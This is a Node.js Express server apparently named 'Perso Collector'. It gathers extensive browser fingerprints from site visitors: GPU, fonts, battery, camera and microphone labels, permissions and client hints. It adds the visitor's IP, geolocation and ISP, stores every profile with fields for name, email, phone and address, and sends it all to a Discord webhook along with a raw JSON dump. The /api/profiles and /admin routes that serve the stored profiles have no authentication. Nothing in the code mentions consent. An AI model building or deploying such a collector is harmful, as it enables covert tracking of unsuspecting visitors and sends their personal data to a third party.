const express = require('express');
const path = require('path');
const fs = require('fs');
const UAParser = require('ua-parser-js');
const db = require('./db');

const app = express();
app.use(express.json({ limit: '2mb' }));
app.use(express.static(path.join(__dirname, 'public')));

let WEBHOOK = process.env.DISCORD_WEBHOOK || '';
if (!WEBHOOK) {
  try {
    const cfg = JSON.parse(fs.readFileSync(path.join(__dirname, 'config.json'), 'utf8'));
    WEBHOOK = cfg.discord_webhook || '';
  } catch {}
}
if (!WEBHOOK) console.warn('[warn] DISCORD_WEBHOOK not set — webhook disabled');

const insert = db.prepare(`
INSERT INTO profiles (ip, user_agent, browser, os, device, language, timezone, screen, fingerprint,
  full_name, email, phone, birthdate, address, city, zip, country, geo_lat, geo_lon, geo_city, geo_country, preferences)
VALUES (@ip, @user_agent, @browser, @os, @device, @language, @timezone, @screen, @fingerprint,
  @full_name, @email, @phone, @birthdate, @address, @city, @zip, @country, @geo_lat, @geo_lon, @geo_city, @geo_country, @preferences)
`);

// ─────────────────────────────────────────────────────────
// helpers
// ─────────────────────────────────────────────────────────
const EMBED_LIMIT_FIELDS = 25;
const EMBED_LIMIT_CHARS = 5800;
const MESSAGE_MAX_EMBEDS = 10;
const RATE_LIMIT_DELAY_MS = 550;

function trunc(s, n) {
  if (s == null) return '';
  s = String(s);
  return s.length > n ? s.slice(0, n - 1) + '…' : s;
}

function fmtBool(v) { return v === true ? '✓' : v === false ? '✗' : '—'; }
function fmtVal(v) {
  if (v === null || v === undefined || v === '') return '—';
  if (Array.isArray(v)) return v.length ? v.join(', ') : '—';
  if (typeof v === 'object') return JSON.stringify(v);
  return String(v);
}

function field(name, value, inline = true) {
  return { name: trunc(name, 256), value: trunc(fmtVal(value), 1000) || '—', inline };
}

function embedCharCount(embed) {
  let n = (embed.title || '').length + (embed.description || '').length + (embed.footer?.text || '').length;
  for (const f of embed.fields || []) n += (f.name || '').length + (f.value || '').length;
  return n;
}

function buildEmbed(title, fields, opts = {}) {
  return {
    title: trunc(title, 256),
    color: opts.color || 0x5b8def,
    timestamp: opts.timestamp || undefined,
    description: opts.description ? trunc(opts.description, 3800) : undefined,
    fields: fields.slice(0, EMBED_LIMIT_FIELDS),
    footer: opts.footer ? { text: trunc(opts.footer, 2048) } : undefined
  };
}

// split a big field list into multiple embeds under the char limit
function splitIntoEmbeds(title, fields, opts = {}) {
  const embeds = [];
  let current = [];
  let currentChars = 0;
  const baseChars = (title || '').length + (opts.footer?.length || 0) + 100;

  for (const f of fields) {
    const fChars = (f.name || '').length + (f.value || '').length;
    const wouldExceedChars = (currentChars + fChars + baseChars) > EMBED_LIMIT_CHARS;
    const wouldExceedFields = current.length >= EMBED_LIMIT_FIELDS;
    if ((wouldExceedChars || wouldExceedFields) && current.length > 0) {
      embeds.push(buildEmbed(title, current, opts));
      current = [];
      currentChars = 0;
    }
    current.push(f);
    currentChars += fChars;
  }
  if (current.length) embeds.push(buildEmbed(title, current, opts));
  return embeds;
}

function chunkArray(arr, size) {
  const out = [];
  for (let i = 0; i < arr.length; i += size) out.push(arr.slice(i, i + size));
  return out;
}

async function postJson(body) {
  const r = await fetch(WEBHOOK, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(body)
  });
  if (!r.ok) {
    const txt = await r.text();
    console.warn('[webhook] HTTP', r.status, txt.slice(0, 300));
  }
  return r;
}

async function postMultipart(formBody) {
  const r = await fetch(WEBHOOK, { method: 'POST', body: formBody });
  if (!r.ok) {
    const txt = await r.text();
    console.warn('[webhook] HTTP', r.status, txt.slice(0, 300));
  }
  return r;
}

const sleep = ms => new Promise(r => setTimeout(r, ms));

// ─────────────────────────────────────────────────────────
// payload builders
// ─────────────────────────────────────────────────────────
function buildHeaderEmbeds(record, prefs) {
  const fields = [
    field('ID', record.id),
    field('IP', record.ip),
    field('Browser', record.browser),
    field('OS', record.os),
    field('Device', record.device || '—'),
    field('Language', record.language),
    field('Timezone', record.timezone),
    field('Screen', record.screen),
    field('Fingerprint', '`' + trunc(record.fingerprint || '—', 80) + '`', false)
  ];

  if (record.geo_lat != null && record.geo_lon != null) {
    fields.push(field('IP Location', `[${record.geo_lat}, ${record.geo_lon}] — ${record.geo_city || '?'}, ${record.geo_country || '?'}`, false));
  }

  if (prefs.geo_full?.isp) {
    fields.push(field('ISP', prefs.geo_full.isp));
    fields.push(field('ASN', prefs.geo_full.as));
    fields.push(field('Org', prefs.geo_full.org));
    fields.push(field('Region', prefs.geo_full.regionName));
    fields.push(field('ZIP', prefs.geo_full.zip || '—'));
  }

  fields.push(field('User-Agent', '`' + trunc(record.user_agent, 400) + '`', false));

  return [buildEmbed('📥 New Profile Collected', fields, {
    color: 0x5b8def,
    timestamp: new Date().toISOString(),
    footer: 'perso-collector · 1/N'
  })];
}

function buildHardwareEmbeds(prefs) {
  const hw = [];
  if (prefs.webgl?.unmasked_vendor) hw.push(field('GPU Vendor', prefs.webgl.unmasked_vendor));
  if (prefs.webgl?.unmasked_renderer) hw.push(field('GPU Renderer', trunc(prefs.webgl.unmasked_renderer, 200)));
  if (prefs.webgl2?.unmasked_renderer && prefs.webgl2.unmasked_renderer !== prefs.webgl?.unmasked_renderer) {
    hw.push(field('GPU Renderer (WebGL2)', trunc(prefs.webgl2.unmasked_renderer, 200)));
  }
  if (prefs.webgl?.version) hw.push(field('WebGL', trunc(prefs.webgl.version, 100)));
  if (prefs.webgl?.shading) hw.push(field('GLSL', trunc(prefs.webgl.shading, 100)));
  if (prefs.webgl?.max_texture) hw.push(field('Max Texture', prefs.webgl.max_texture));
  if (prefs.hardware_concurrency) hw.push(field('CPU Threads', prefs.hardware_concurrency));
  if (prefs.device_memory_gb) hw.push(field('RAM', prefs.device_memory_gb + ' GB'));
  if (prefs.device_pixel_ratio) hw.push(field('DPR', prefs.window?.device_pixel_ratio));
  if (prefs.max_touch_points != null) hw.push(field('Touch Points', prefs.max_touch_points));
  if (prefs.screen) hw.push(field('Screen', `${prefs.screen.width}x${prefs.screen.height} @${prefs.screen.color_depth}-bit`));
  if (prefs.screen?.orientation) hw.push(field('Orientation', `${prefs.screen.orientation.type} ${prefs.screen.orientation.angle}°`));
  if (prefs.window) hw.push(field('Window', `${prefs.window.inner_width}x${prefs.window.inner_height} (out ${prefs.window.outer_width}x${prefs.window.outer_height})`));
  if (prefs.platform) hw.push(field('Platform', prefs.platform));
  if (prefs.vendor) hw.push(field('Vendor', prefs.vendor));

  const net = [];
  if (prefs.connection) {
    net.push(field('Connection Type', prefs.connection.type || '—'));
    net.push(field('Downlink', prefs.connection.downlink ? prefs.connection.downlink + ' Mbps' : '—'));
    net.push(field('Downlink Max', prefs.connection.downlink_max || '—'));
    net.push(field('RTT', prefs.connection.rtt != null ? prefs.connection.rtt + ' ms' : '—'));
    net.push(field('Data Saver', fmtBool(prefs.connection.save_data)));
  }
  if (prefs.online != null) net.push(field('Online', fmtBool(prefs.online)));

  const battery = [];
  if (prefs.battery) {
    battery.push(field('Level', Math.round((prefs.battery.level || 0) * 100) + '%'));
    battery.push(field('Charging', fmtBool(prefs.battery.charging)));
    if (prefs.battery.charging_time && isFinite(prefs.battery.charging_time)) battery.push(field('Time to Full', Math.round(prefs.battery.charging_time / 60) + ' min'));
    if (prefs.battery.discharging_time && isFinite(prefs.battery.discharging_time)) battery.push(field('Time to Empty', Math.round(prefs.battery.discharging_time / 60) + ' min'));
  }

  const media = [];
  if (prefs.media_devices) {
    const groups = { audioinput: 'Microphones', audiooutput: 'Outputs', videoinput: 'Cameras' };
    for (const [kind, label] of Object.entries(groups)) {
      const devs = prefs.media_devices.filter(d => d.kind === kind);
      if (devs.length) {
        const named = devs.map(d => d.label || '(unlabeled)').join(', ');
        media.push(field(label, trunc(named, 500), false));
      }
    }
  }

  const embeds = [];
  if (hw.length) embeds.push(buildEmbed('🖥 Hardware', hw, { color: 0x8b5bef }));
  if (net.length) embeds.push(buildEmbed('🌐 Network', net, { color: 0x5bef8b }));
  if (battery.length) embeds.push(buildEmbed('🔋 Battery', battery, { color: 0xf5c242 }));
  if (media.length) embeds.push(buildEmbed('🎥 Media Devices', media, { color: 0xef5b8b }));
  return embeds;
}

function buildSoftwareEmbeds(prefs) {
  const embeds = [];

  if (prefs.fonts?.length) {
    const chunks = chunkArray(prefs.fonts, 30);
    chunks.forEach((fonts, i) => {
      const f = [field(`Fonts (${i * 30 + 1}–${i * 30 + fonts.length} of ${prefs.fonts.length})`, fonts.join(', '), false)];
      embeds.push(buildEmbed(`🔤 Installed Fonts ${chunks.length > 1 ? `(${i + 1}/${chunks.length})` : ''}`, f, { color: 0x8befdb }));
    });
  }

  if (prefs.plugins?.length) {
    const pf = prefs.plugins.slice(0, 20).map(p => field(p.name || '(unnamed)', trunc(p.description || p.filename || '—', 200), false));
    embeds.push(buildEmbed('🔌 Plugins', pf, { color: 0xb8ef5b }));
  }

  if (prefs.permissions) {
    const pf = Object.entries(prefs.permissions).map(([k, v]) => field(k, v, true));
    embeds.push(buildEmbed('🔐 Permissions', pf, { color: 0xef8b5b }));
  }

  if (prefs.capabilities) {
    const cf = Object.entries(prefs.capabilities).map(([k, v]) => field(k, fmtBool(v), true));
    embeds.push(buildEmbed('⚙️ Capabilities', cf, { color: 0x5b8bef }));
  }

  if (prefs.codecs) {
    const cf = Object.entries(prefs.codecs).map(([k, v]) => field(k, v || 'no', true));
    embeds.push(buildEmbed('🎞️ Codecs', cf, { color: 0xef5bb8 }));
  }

  if (prefs.tts_voices?.length) {
    embeds.push(buildEmbed('🗣️ TTS Voices', [field('Count', prefs.tts_voices.length), field('Sample', trunc(prefs.tts_voices.slice(0, 5).join('\n'), 900), false)], { color: 0x5befef }));
  }

  if (prefs.css_support) {
    const cf = Object.entries(prefs.css_support).map(([k, v]) => field(k, fmtBool(v), true));
    embeds.push(buildEmbed('🎨 CSS Support', cf, { color: 0xef5b5b }));
  }

  return embeds;
}

function buildEnvironmentEmbeds(prefs) {
  const env = [];
  if (prefs.timezone) env.push(field('Timezone', prefs.timezone));
  if (prefs.tz_offset_min != null) env.push(field('TZ Offset', prefs.tz_offset_min + ' min'));
  if (prefs.calendar) env.push(field('Calendar', prefs.calendar));
  if (prefs.numbering) env.push(field('Numbering', prefs.numbering));
  if (prefs.currency) env.push(field('Currency', prefs.currency));
  if (prefs.currency_locale) env.push(field('Currency Locale', prefs.currency_locale));
  if (prefs.languages) env.push(field('Languages', prefs.languages.join(', '), false));
  if (prefs.language) env.push(field('Primary Language', prefs.language));
  if (prefs.date_string) env.push(field('Local Time String', prefs.date_string, false));
  if (prefs.document_charset) env.push(field('Charset', prefs.document_charset));
  if (prefs.referrer) env.push(field('Referrer', prefs.referrer, false));
  if (prefs.url) env.push(field('URL', prefs.url, false));
  if (prefs.history_length != null) env.push(field('History Length', prefs.history_length));

  const ua = [];
  if (prefs.ua_ch) {
    const ch = prefs.ua_ch;
    if (ch.brands) ua.push(field('Brands', ch.brands.map(b => `${b.brand} ${b.version}`).join(', '), false));
    if (ch.platform) ua.push(field('CH Platform', ch.platform));
    if (ch.platformVersion) ua.push(field('CH Platform Version', ch.platformVersion));
    if (ch.architecture) ua.push(field('CH Architecture', ch.architecture));
    if (ch.bitness) ua.push(field('CH Bitness', ch.bitness));
    if (ch.model) ua.push(field('CH Model', ch.model));
    if (ch.mobile != null) ua.push(field('CH Mobile', fmtBool(ch.mobile)));
    if (ch.uaFullVersion) ua.push(field('UA Full Version', ch.uaFullVersion));
    if (ch.fullVersionList) ua.push(field('Full Version List', ch.fullVersionList.map(v => `${v.brand} ${v.version}`).join(', '), false));
    if (ch.wow64 != null) ua.push(field('Wow64', fmtBool(ch.wow64)));
  }

  const timing = [];
  if (prefs.timing) {
    for (const [k, v] of Object.entries(prefs.timing)) {
      if (v != null) timing.push(field(k, v, true));
    }
  }
  if (prefs.timing_resolution != null) timing.push(field('Timing Resolution', prefs.timing_resolution + ' ms'));

  const embeds = [];
  if (env.length) embeds.push(buildEmbed('🌍 Environment', env, { color: 0x8bef5b }));
  if (ua.length) embeds.push(buildEmbed('🧭 User-Agent Client Hints', ua, { color: 0x5b5bef }));
  if (timing.length) embeds.push(buildEmbed('⏱️ Timing', timing, { color: 0x5bef5b }));
  return embeds;
}

// ─────────────────────────────────────────────────────────
// main sender — pieces everything into multiple messages
// ─────────────────────────────────────────────────────────
async function sendWebhook(record) {
  if (!WEBHOOK) return;

  let prefs = {};
  try { prefs = JSON.parse(record.preferences || '{}'); } catch {}

  const groups = [
    { embeds: buildHeaderEmbeds(record, prefs), label: 'header' },
    { embeds: buildHardwareEmbeds(prefs), label: 'hardware' },
    { embeds: buildSoftwareEmbeds(prefs), label: 'software' },
    { embeds: buildEnvironmentEmbeds(prefs), label: 'environment' }
  ].filter(g => g.embeds.length > 0);

  // split each group into Discord messages of max 10 embeds
  const messages = [];
  for (const g of groups) {
    const chunks = chunkArray(g.embeds, MESSAGE_MAX_EMBEDS);
    for (const chunk of chunks) {
      messages.push({
        username: 'Perso Collector',
        embeds: chunk.map((e, idx) => ({
          ...e,
          footer: { text: e.footer?.text || `perso-collector · ${g.label} · ${idx + 1}/${chunk.length}` }
        }))
      });
    }
  }

  // post sequentially with rate-limit safety
  for (let i = 0; i < messages.length; i++) {
    try {
      await postJson(messages[i]);
    } catch (err) {
      console.warn('[webhook] message', i + 1, 'failed:', err.message);
    }
    if (i < messages.length - 1) await sleep(RATE_LIMIT_DELAY_MS);
  }

  // final message: full JSON as file attachment
  const fullJson = JSON.stringify(prefs, null, 2);
  const filename = `profile_${record.id || Date.now()}.json`;
  const form = new FormData();
  form.append('payload_json', JSON.stringify({
    username: 'Perso Collector',
    embeds: [{
      title: '📎 Full Raw Data',
      description: `Attached file: \`${filename}\`\nSize: ${(fullJson.length / 1024).toFixed(1)} KB`,
      color: 0x9aa4b2,
      timestamp: new Date().toISOString(),
      footer: { text: 'perso-collector · raw json' }
    }]
  }));
  form.append('files[0]', new Blob([fullJson], { type: 'application/json' }), filename);

  try {
    await postMultipart(form);
  } catch (err) {
    console.warn('[webhook] attachment failed:', err.message);
  }
}

// ─────────────────────────────────────────────────────────
// routes
// ─────────────────────────────────────────────────────────
app.post('/api/collect', async (req, res) => {
  try {
    const body = req.body || {};
    const ip = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || '').split(',')[0].trim();
    const ua = req.headers['user-agent'] || '';
    const parser = new UAParser(ua);
    const u = parser.getResult();

    let geo = {};
    try {
      const r = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,regionName,city,zip,lat,lon,isp,org,as,query`);
      const j = await r.json();
      if (j.status === 'success') geo = j;
    } catch (_) {}

    const record = {
      ip,
      user_agent: ua,
      browser: `${u.browser.name || ''} ${u.browser.version || ''}`.trim(),
      os: `${u.os.name || ''} ${u.os.version || ''}`.trim(),
      device: `${u.device.vendor || ''} ${u.device.model || ''} ${u.device.type || ''}`.trim(),
      language: body.language || '',
      timezone: body.timezone || '',
      screen: body.screen || '',
      fingerprint: body.fingerprint || '',
      full_name: '',
      email: '',
      phone: '',
      birthdate: '',
      address: '',
      city: geo.city || '',
      zip: geo.zip || '',
      country: geo.country || '',
      geo_lat: geo.lat ?? null,
      geo_lon: geo.lon ?? null,
      geo_city: geo.city || '',
      geo_country: geo.country || '',
      preferences: JSON.stringify({
        ...(body.preferences || {}),
        geo_full: geo
      })
    };

    const info = insert.run(record);
    record.id = info.lastInsertRowid;

    sendWebhook(record);

    res.json({ ok: true, id: record.id });
  } catch (err) {
    console.error(err);
    res.status(500).json({ ok: false, error: err.message });
  }
});

app.get('/api/profiles', (req, res) => {
  const rows = db.prepare('SELECT * FROM profiles ORDER BY id DESC').all();
  res.json(rows);
});

app.get('/api/profiles/:id', (req, res) => {
  const row = db.prepare('SELECT * FROM profiles WHERE id = ?').get(req.params.id);
  if (!row) return res.status(404).json({ ok: false });
  res.json(row);
});

app.get('/admin', (req, res) => {
  res.sendFile(path.join(__dirname, 'admin.html'));
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`http://localhost:${PORT}`));
